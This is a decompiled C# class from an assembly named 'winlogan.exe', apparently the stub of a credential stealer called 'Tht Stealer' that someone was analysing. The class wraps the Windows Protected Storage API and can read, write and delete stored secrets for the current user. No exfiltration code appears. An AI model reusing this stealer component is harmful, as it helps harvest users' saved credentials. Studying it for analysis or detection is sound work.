// Decompiled with JetBrains decompiler
// Type: CProtectStore
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using PStoreLib;
using System;
using System.Runtime.InteropServices;

internal class CProtectStore : CUtils
{
  private IPStore m_PStore;
  private PST_KEY m_KeyType;

  public PST_KEY KeyType
  {
    get
    {
      return this.m_KeyType;
    }
    set
    {
      this.m_KeyType = value;
    }
  }

  public CTypes Types
  {
    get
    {
      return new CTypes(this.m_PStore, this.m_KeyType);
    }
  }

  public CProtectStore()
  {
    this.m_PStore = CProtectStore.GetPStoreInterface();
    this.m_KeyType = PST_KEY.PST_KEY_CURRENT_USER;
  }

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int lstrlenA(int lpString);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int lstrlenW(int lpString);

  [DllImport("pstorec.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int PStoreCreateInstance(ref IPStore ppProvider, ref Guid pProviderID, int pReserved, int dwFlags);

  private static IPStore GetPStoreInterface()
  {
    IPStore pstore = (IPStore) null;
    // ISSUE: explicit reference operation
    // ISSUE: variable of a reference type
    IPStore& ppProvider = @pstore;
    Guid guid = guidProvider.MS_BASE_PSTPROVIDER_SZID;
    // ISSUE: explicit reference operation
    // ISSUE: variable of a reference type
    Guid& pProviderID = @guid;
    int pReserved = 0;
    int dwFlags = 0;
    CProtectStore.PStoreCreateInstance(ppProvider, pProviderID, pReserved, dwFlags);
    return pstore;
  }

  public CItems get_Items(Guid guidItemType, Guid guidItemSubType)
  {
    return new CItems(this.m_PStore, this.m_KeyType, ref guidItemType, ref guidItemSubType);
  }

  public void CreateType(Guid guidItemType, string szDisplayName)
  {
    PST_TYPEINFO pInfo;
    pInfo.cbSize = Marshal.SizeOf((object) pInfo);
    pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
    try
    {
      this.m_PStore.CreateType(this.m_KeyType, ref guidItemType, ref pInfo, 0);
    }
    finally
    {
      Marshal.FreeHGlobal(pInfo.szDisplayName);
    }
  }

  public void CreateSubType(Guid guidItemType, Guid guidItemSubType, string szDisplayName)
  {
    PST_TYPEINFO pInfo;
    pInfo.cbSize = Strings.Len((object) pInfo);
    pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
    try
    {
      PST_ACCESSRULESET pRules;
      pRules.cbSize = Marshal.SizeOf((object) pRules);
      pRules.cRules = 0;
      pRules.rgRules = 0;
      this.m_PStore.CreateSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, ref pInfo, ref pRules, 0);
    }
    finally
    {
      Marshal.FreeHGlobal(pInfo.szDisplayName);
    }
  }

  public void DeleteItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
  {
    this.m_PStore.DeleteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, 0, 0);
  }

  public void DeleteType(Guid guidItemType)
  {
    this.m_PStore.DeleteType(this.m_KeyType, ref guidItemType, 0);
  }

  public void DeleteSubType(Guid guidItemType, Guid guidItemSubType)
  {
    this.m_PStore.DeleteSubtype(this.m_KeyType, ref guidItemType, ref guidItemSubType, 0);
  }

  public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
  {
    byte[] destination = (byte[]) null;
    int pcbData;
    IntPtr ppbData;
    this.m_PStore.ReadItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, out pcbData, out ppbData, 0, 0);
    if (ppbData != IntPtr.Zero)
    {
      destination = new byte[checked (pcbData - 1 + 1)];
      Marshal.Copy(ppbData, destination, 0, pcbData);
    }
    return destination;
  }

  public void WriteItem(Guid guidItemType, Guid guidItemSubType, string szItemName, int ptrBuff, int pcbBuff)
  {
    PST_PROMPTINFO pPromptInfo;
    pPromptInfo.cbSize = Marshal.SizeOf((object) pPromptInfo);
    pPromptInfo.dwPromptFlags = 2;
    pPromptInfo.hwndApp = 0;
    pPromptInfo.szPrompt = 0;
    this.m_PStore.WriteItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, pcbBuff, ptrBuff, ref pPromptInfo, 1, 0);
  }
}
